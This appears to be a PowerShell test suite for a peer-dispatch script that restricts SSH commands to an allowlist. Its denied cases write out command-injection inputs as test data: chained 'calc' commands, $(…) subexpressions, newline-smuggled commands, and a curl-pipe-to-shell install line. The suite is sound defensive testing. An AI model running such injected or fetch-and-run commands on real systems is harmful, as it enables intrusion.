# Plain PowerShell asserts for resources/peer-dispatch.ps1. Run: powershell -NoProfile -File tests/peer-dispatch.tests.ps1
# Uses a fake herdr.cmd that prints its arguments, so nothing real is touched.
$ErrorActionPreference = 'Stop'
$disp = Join-Path $PSScriptRoot '..\resources\peer-dispatch.ps1' | Resolve-Path | ForEach-Object Path
$tmp = Join-Path ([IO.Path]::GetTempPath()) ("wooloo-disp-" + [guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $tmp | Out-Null
$fake = Join-Path $tmp 'herdr.cmd'
Set-Content -Path $fake -Encoding ASCII -Value @(
    '@echo off',
    'if "%~1"=="--version" (echo herdr 0.9.5& exit /b 0)',
    'if defined FAKE_NOCHECK (echo %* | findstr /c:"--check" >nul && exit /b 1)',
    'echo %* | findstr /c:"--check" >nul && (echo herdr-api-bridge-v1& exit /b 0)',
    'echo ARGS:%*',
    'exit /b 0'
)
$fails = 0
$al = Get-Content -Raw -LiteralPath (Join-Path $PSScriptRoot '..\docs\peer-allowlist.json') | ConvertFrom-Json
$MARKER = $al.marker; $PREFIX = $al.markerPrefix
$fwd = $fake -replace '\\', '/'
$inFile = Join-Path $tmp 'in.txt'
function Run([string]$req, [string]$peer = 'studio-mac', [string]$stdin = '') {
    $env:SSH_ORIGINAL_COMMAND = $req
    [IO.File]::WriteAllText($inFile, $stdin, (New-Object Text.UTF8Encoding $false))
    $o = Join-Path $tmp 'out.txt'; $e = Join-Path $tmp 'err.txt'
    $p = Start-Process powershell -ArgumentList @('-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-File', $disp, '-Peer', ('"' + $peer + '"'), '-Herdr', $fake) `
        -Wait -PassThru -NoNewWindow -RedirectStandardInput $inFile -RedirectStandardOutput $o -RedirectStandardError $e
    [pscustomobject]@{ Code = $p.ExitCode; Out = (Get-Content $o -Raw); Err = (Get-Content $e -Raw) }
}
function Check([string]$name, [bool]$ok) {
    if ($ok) { Write-Host "ok   $name" } else { Write-Host "FAIL $name"; $script:fails++ }
}
function Allowed([string]$name, [string]$req, [string]$expectOut, [string]$stdin = '', [int]$code = 0) {
    $r = Run $req 'studio-mac' $stdin
    Check $name (($r.Code -eq $code) -and ($r.Out -like "*$expectOut*"))
    if ($r.Code -ne $code) { Write-Host "     exit $($r.Code) stderr: $($r.Err)" }
}
function Denied([string]$name, [string]$req, [string]$peer = 'studio-mac', [string]$stdin = '') {
    $r = Run $req $peer $stdin
    Check $name (($r.Code -eq 64) -and ($r.Err -like 'wooloo-peer-bridge:*') -and -not ($r.Out -like '*ARGS:*') -and -not ($r.Out -like '*herdr-api-bridge-v1*'))
}
# Fill a template's slots. -Session 'default' gives empty {sessionArgs}.
function Fill([string]$t, [string]$session = 'wooloo', [string]$herdr = $fwd) {
    $sa = if ($session -eq 'default') { '' } else { "--session $session " }
    $t.Replace('{sessionArgs}', $sa).Replace('{session}', $session).Replace('{version}', '0.9.5').Replace('{herdr}', $herdr)
}
# Run one entry through its transport. Marker-framed output is checked separately.
function Req([object]$e, [string]$session = 'wooloo', [string]$herdr = $fwd) {
    $body = Fill ([string]$e.template) $session $herdr
    if ($e.transport -eq 'stdin') { Run '/bin/sh -s' 'studio-mac' ($PREFIX + $body) } else { Run $body 'studio-mac' '' }
}


# one allow case per template (names match docs/peer-allowlist.json)
$expect = @{
    'wooloo-hello' = 'wooloo-peer-bridge-v1 0.9.5'
    'wooloo-api' = 'ARGS:--session wooloo remote-api-bridge'
    'wooloo-client' = 'ARGS:--session wooloo remote-client-bridge'
    'wooloo-check' = 'herdr-api-bridge-v1'
    'herdr-path-probe' = 'herdr.cmd'
    'herdr-client-bridge' = 'ARGS:--session wooloo remote-client-bridge'
    'herdr-client-bridge-idle' = 'ARGS:--session wooloo remote-client-bridge --idle-timeout-v1'
    'herdr-api-bridge' = 'ARGS:--session wooloo remote-api-bridge'
    'herdr-api-check' = 'herdr-api-bridge-v1'
    'herdr-api-discovery' = 'herdr.cmd'
    'herdr-cached-api' = 'ARGS:--session wooloo remote-api-bridge'
    'sh-uname' = 'Windows_NT'
    'sh-path-probe' = 'herdr.cmd'
    'sh-candidates' = 'herdr.cmd'
    'sh-exists' = $MARKER
    'sh-client-status' = 'ARGS:status client --json'
    'sh-server-status' = 'ARGS:--session wooloo status server --json'
    'sh-session-list' = 'ARGS:session list --json'
    'sh-saved-bridge' = 'ARGS:--session wooloo remote-client-bridge'
}
foreach ($e in @($al.entries)) {
    $r = Req $e
    $want = $expect[[string]$e.name]
    $framed = ($e.transport -eq 'stdin') -or ([string]$e.template).StartsWith($PREFIX) -or ($e.name -eq 'herdr-cached-api')
    $ok = ($r.Code -eq 0) -and ($r.Out -like "*$want*")
    if ($framed) { $ok = $ok -and ($r.Out -like "`n$MARKER`n*" -or $r.Out -like "`r`n$MARKER`r`n*") }
    Check "allow $($e.name)" $ok
    if (-not $ok) { Write-Host "     exit $($r.Code) out: $($r.Out) err: $($r.Err)" }
}
# {sessionArgs} with the default session is empty; quoted herdr path is accepted too
$byName = @{}; foreach ($e in @($al.entries)) { $byName[[string]$e.name] = $e }
$r = Req $byName['herdr-client-bridge'] 'default'
Check 'allow default session (no --session)' (($r.Code -eq 0) -and ($r.Out -like '*ARGS:remote-client-bridge*') -and -not ($r.Out -like '*--session*'))
$r = Req $byName['herdr-api-bridge'] 'wooloo' ("'" + $fwd + "'")
Check 'allow single-quoted herdr path' (($r.Code -eq 0) -and ($r.Out -like '*ARGS:--session wooloo remote-api-bridge*'))

# api probe failing: discovery exits 2, cached exits 78
$env:FAKE_NOCHECK = '1'
$r = Req $byName['herdr-api-discovery']
Check 'discovery without api support: exit 2' (($r.Code -eq 2) -and ($r.Err -like '*does not support machine API forwarding*'))
$r = Req $byName['herdr-cached-api']
Check 'cached api stale: exit 78' (($r.Code -eq 78) -and ($r.Err -like '*herdr-machine-metadata-stale-v1*'))
Remove-Item Env:FAKE_NOCHECK

# denied: injection and near misses of every transport
Denied 'empty' ''
Denied 'semicolon' 'wooloo-peer hello; calc'
Denied 'semicolon in session' 'wooloo-peer api wooloo;calc'
Denied 'subexpression' 'wooloo-peer api $(calc)'
Denied 'powershell subexpression' 'wooloo-peer api wooloo$(calc)'
Denied 'backtick' 'wooloo-peer api woo`loo'
Denied 'pipe' 'wooloo-peer hello | calc'
Denied 'ampersand' 'wooloo-peer hello & calc'
Denied 'redirect' 'wooloo-peer hello > x.txt'
Denied 'cmd.exe /c' 'cmd.exe /c calc'
Denied 'powershell -Command' 'powershell -Command calc'
Denied 'newline after hello' "wooloo-peer hello`ncalc"
Denied 'trailing space' 'wooloo-peer hello '
Denied 'trailing newline' "wooloo-peer hello`n"
Denied 'bad session chars' 'wooloo-peer api wo oloo'
Denied 'session too long' ("wooloo-peer api " + ('a' * 65))
Denied 'bad peer name' 'wooloo-peer hello' 'Bad Peer'
Denied 'peer with semicolon' 'wooloo-peer hello' 'a;b'
Denied 'oversize request' ('x' * 17000)
Denied 'old loose exec line' 'exec herdr --session wooloo remote-api-bridge'
Denied 'exec without marker prefix' "exec $fwd --session wooloo remote-api-bridge"
$fb = Fill ([string]$byName['herdr-api-bridge'].template)
Denied 'bridge + chained command' ($fb + '; calc')
Denied 'bridge + extra arg' ($fb + ' --evil')
Denied 'bridge + subshell session' (Fill ([string]$byName['herdr-api-bridge'].template) 'a$(calc)')
Denied 'bridge + backtick session' (Fill ([string]$byName['herdr-api-bridge'].template) 'a`calc`')
Denied 'wrong herdr path' (Fill ([string]$byName['herdr-api-bridge'].template) 'wooloo' 'C:/evil/herdr.exe')
Denied 'wrong herdr path, posix' (Fill ([string]$byName['herdr-api-bridge'].template) 'wooloo' '/opt/evil/herdr')
Denied 'backslash herdr path' (Fill ([string]$byName['herdr-api-bridge'].template) 'wooloo' ($fake))
Denied 'two commands (newline)' ($fb + "`nexec $fwd remote-client-bridge")
Denied 'explicit --session default' ((Fill ([string]$byName['herdr-client-bridge'].template) 'wooloo').Replace('--session wooloo ', '--session default '))
Denied 'bad version in candidates' ('/bin/sh -s') 'studio-mac' ($PREFIX + (Fill ([string]$byName['sh-candidates'].template) 'wooloo' $fwd).Replace('version=0.9.5', 'version=1;calc'))
# stdin transport: only the exact script bodies, with the marker prefix
Denied 'sh -s with no stdin' '/bin/sh -s'
Denied 'sh -s, other script' '/bin/sh -s' 'studio-mac' ($PREFIX + "calc`n")
Denied 'sh -s, script without marker prefix' '/bin/sh -s' 'studio-mac' "uname -s`nuname -m`n"
Denied 'sh -s, extra line after script' '/bin/sh -s' 'studio-mac' ($PREFIX + "uname -s`nuname -m`ncalc`n")
Denied 'sh -s, install script' '/bin/sh -s' 'studio-mac' ($PREFIX + "curl -fsSL https://example.invalid/install.sh | sh`n")
Denied 'sh -s, server stop' '/bin/sh -s' 'studio-mac' ($PREFIX + "$fwd server stop`n")
Denied 'sh -s, chained status' '/bin/sh -s' 'studio-mac' ($PREFIX + "$fwd session list --json; calc")
Denied 'sh -s, oversize stdin' '/bin/sh -s' 'studio-mac' ($PREFIX + ('x' * 17000))
Denied 'sh -s with trailing space in command' '/bin/sh -s ' 'studio-mac' ($PREFIX + "uname -s`nuname -m`n")
Denied 'sh -c from the request' '/bin/sh -c calc'

Remove-Item -Recurse -Force $tmp
if ($fails -gt 0) { Write-Host "$fails failed"; exit 1 }
Write-Host 'all passed'
